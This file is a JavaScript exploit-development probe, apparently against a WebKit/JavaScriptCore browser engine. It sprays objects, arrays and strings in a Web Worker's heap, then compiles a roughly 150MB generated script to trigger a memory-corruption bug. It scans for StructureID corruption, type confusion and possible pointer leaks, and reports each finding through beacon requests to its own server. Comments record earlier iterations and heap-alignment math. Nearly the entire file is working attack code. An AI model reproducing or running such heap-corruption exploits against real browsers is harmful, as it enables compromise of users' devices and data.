// p386 - Worker-side StructureID corruption detection
//
// V385 RESULT: Main-thread MarkedSpace NOT in sweep path (TOTAL-HITS-0).
// V383/V384: Worker MarkedSpace IS in sweep path (all 10 strings m_length corrupted).
//
// KEY INSIGHT: Worker VM mapped at higher address. Sweep from MetaTable reaches it.
//
// ALIGNMENT MATH (32-byte cells, 112-byte sweep stride):
//   LCM(32,112) = 224. 7 distinct cell alignments mod 112.
//   Cells at alignment A+68: StructureID (offset 0) = bytecodeIndex (4B write).
//   JSType byte (offset 5) NOT written -> typeof preserved.
//   Only write to this cell: StructureID. Properties/butterfly intact.
//   Expected: ~1/7 of worker cells (14.3%) show StructureID corruption.
//
// Beacon prefix: V386-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V386-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V386-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }

  B('BOOT');

  var workerCode = function() {
    var baseUrl = '';
    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V386-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }

    var objs = [];
    var arrs = [];
    var strs = [];

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') { baseUrl = e.data.baseUrl; beacon('ALIVE'); return; }

      if (e.data.cmd === 'alloc') {
        // Spray objects in Worker's MarkedSpace
        for (var i = 0; i < 4000; i++) {
          objs.push({ _m: i, _v: 1111111 + i });
        }
        beacon('OBJ-' + objs.length);

        // Spray arrays
        for (var i = 0; i < 2000; i++) {
          arrs.push([i, i + 0.5, i + 1]);
        }
        beacon('ARR-' + arrs.length);

        // Oracle strings (1000 chars each)
        for (var i = 0; i < 20; i++) {
          var s = '';
          for (var j = 0; j < 10; j++) s += 'SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS';
          s = s.substring(0, 1000);
          s.charCodeAt(0);
          strs.push(s);
        }
        beacon('STR-' + strs.length);

        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');

        // === String oracle ===
        var sCorrupt = 0;
        for (var i = 0; i < strs.length; i++) {
          try {
            var len = strs[i].length;
            if (len !== 1000) {
              sCorrupt++;
              if (sCorrupt <= 5) beacon('S' + i + '-LEN-' + len);
            }
          } catch(ex) {
            sCorrupt++;
            if (sCorrupt <= 3) beacon('S' + i + '-SERR-' + (ex.message || '').substring(0, 20));
          }
        }
        beacon('SORACLE-' + sCorrupt);

        // === Object scan ===
        var objType = 0, objVal = 0, objProto = 0, objCrash = 0, objUndef = 0;
        var firstCorruptIdx = -1;

        for (var i = 0; i < objs.length; i++) {
          try {
            var o = objs[i];

            // typeof should be preserved (JSType byte at offset 5 not written)
            var t = typeof o;
            if (t !== 'object') {
              objType++;
              if (objType <= 5) beacon('O' + i + '-TYPE-' + t);
              if (firstCorruptIdx < 0) firstCorruptIdx = i;
              continue;
            }

            // Property access - uses StructureID to find property offset
            var m;
            try { m = o._m; } catch(e2) {
              objCrash++;
              if (objCrash <= 5) beacon('O' + i + '-PROPCRASH-' + (e2.message || '').substring(0, 25));
              if (firstCorruptIdx < 0) firstCorruptIdx = i;
              continue;
            }

            if (m === undefined) {
              // StructureID might point to a structure without _m property
              objUndef++;
              if (objUndef <= 10) {
                beacon('O' + i + '-UNDEF');
                // Try to get info about what the object looks like now
                try {
                  var keys = Object.keys(o);
                  beacon('O' + i + '-KEYS-' + keys.length + '-' + keys.slice(0, 3).join(','));
                } catch(e3) {
                  beacon('O' + i + '-KEYSERR');
                }
                try {
                  var cn = o.constructor ? (o.constructor.name || 'anon') : 'null';
                  beacon('O' + i + '-CTOR-' + cn);
                } catch(e3) {
                  beacon('O' + i + '-CTORERR');
                }
              }
              if (firstCorruptIdx < 0) firstCorruptIdx = i;
            } else if (m !== i) {
              // StructureID points to wrong structure -> reading wrong offset -> info leak!
              objVal++;
              if (objVal <= 10) {
                beacon('O' + i + '-WRONGVAL-' + m);
                // This is potentially a raw pointer or internal value leak
                try {
                  var v = o._v;
                  beacon('O' + i + '-V2-' + v);
                } catch(e3) {}
              }
              if (firstCorruptIdx < 0) firstCorruptIdx = i;
            }

            // Constructor check
            try {
              if (o.constructor !== Object) {
                objProto++;
                if (objProto <= 5) {
                  var cn = 'unk';
                  try { cn = o.constructor.name || o.constructor.toString().substring(0, 15); } catch(e3) {}
                  beacon('O' + i + '-PROTO-' + cn);
                }
                if (firstCorruptIdx < 0) firstCorruptIdx = i;
              }
            } catch(e2) {
              objProto++;
              if (objProto <= 3) beacon('O' + i + '-PROTOERR');
            }

          } catch(ex) {
            objCrash++;
            if (objCrash <= 10) beacon('O' + i + '-CRASH-' + (ex.message || '').substring(0, 25));
            if (firstCorruptIdx < 0) firstCorruptIdx = i;
          }
        }
        beacon('OBJ-T' + objType + '-V' + objVal + '-U' + objUndef + '-P' + objProto + '-C' + objCrash);
        if (firstCorruptIdx >= 0) beacon('OBJ-FIRST-' + firstCorruptIdx);

        // === Array scan ===
        var arrLen = 0, arrVal = 0, arrIsArr = 0, arrCrash = 0;

        for (var i = 0; i < arrs.length; i++) {
          try {
            var a = arrs[i];
            try {
              if (!Array.isArray(a)) {
                arrIsArr++;
                if (arrIsArr <= 5) beacon('A' + i + '-NOTARR');
              }
            } catch(e2) { arrIsArr++; }

            var len = a.length;
            if (len !== 3) {
              arrLen++;
              if (arrLen <= 5) beacon('A' + i + '-LEN-' + len);
            }

            if (a[0] !== i) {
              arrVal++;
              if (arrVal <= 5) beacon('A' + i + '-V0-' + a[0]);
            }
          } catch(ex) {
            arrCrash++;
            if (arrCrash <= 5) beacon('A' + i + '-CRASH-' + (ex.message || '').substring(0, 25));
          }
        }
        beacon('ARR-L' + arrLen + '-V' + arrVal + '-I' + arrIsArr + '-C' + arrCrash);

        // === Summary ===
        var total = objType + objVal + objUndef + objProto + objCrash + arrLen + arrVal + arrIsArr + arrCrash;
        beacon('TOTAL-' + total);

        // === If hits found, map the corruption pattern ===
        if (total > 0) {
          beacon('PATTERN-SCAN');
          // Count objects at each position mod 7 (cell alignment classes)
          var modCounts = [0,0,0,0,0,0,0];
          var modCorrupt = [0,0,0,0,0,0,0];
          for (var i = 0; i < objs.length; i++) {
            var mod = i % 7;
            modCounts[mod]++;
            try {
              var o = objs[i];
              if (typeof o !== 'object' || o._m !== i) {
                modCorrupt[mod]++;
              }
            } catch(e) {
              modCorrupt[mod]++;
            }
          }
          for (var m = 0; m < 7; m++) {
            if (modCorrupt[m] > 0) {
              beacon('MOD' + m + '-' + modCorrupt[m] + '/' + modCounts[m]);
            }
          }
        }

        beacon('ALL-DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(['(' + workerCode.toString() + ')()'], { type: 'application/javascript' });
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: location.protocol + '//' + location.host });

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      // GC pressure then build
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 500; j++) new ArrayBuffer(4096);
        gcR++;
        if (gcR < 20) setTimeout(gc, 20);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
    if (e.data.done) {
      B('SCAN-COMPLETE');
    }
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p386fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p386ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p386ok ? 'OK' : 'FAIL'));
      // Tell worker to scan
      setTimeout(function() { worker.postMessage({ cmd: 'scan' }); }, 200);
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
